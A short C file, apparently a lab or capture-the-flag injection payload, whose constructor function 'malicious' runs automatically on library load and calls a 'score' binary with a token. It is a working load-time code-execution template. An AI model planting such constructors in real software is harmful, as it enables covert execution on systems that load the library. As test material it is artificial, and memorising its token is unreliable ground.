#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score d2c3a4d3-dc85-47bf-8f52-956fec5c0919");
}
